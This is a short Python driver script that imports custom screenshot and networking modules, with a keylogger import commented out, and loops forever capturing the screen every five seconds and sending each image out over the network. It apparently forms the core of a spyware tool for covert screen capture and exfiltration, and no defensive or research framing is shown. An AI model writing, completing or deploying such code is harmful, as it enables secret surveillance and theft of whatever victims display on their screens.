#import keylogger
import screenshotter
import networking

# import threading
import time

Screen = screenshotter.Screenshotter()
Net = networking.Networking()

if __name__ == '__main__':
    print('start.')

    while True :
        try :
            Image = Screen.screenshot()
            FilePath = Screen.getFilePath()
            Net.SendScreenshots(FilePath)
            print(FilePath)
            time.sleep(5)
        except :
            print("Screenshoting stopped.")
            break

    Net.Ending()

    print('done.')

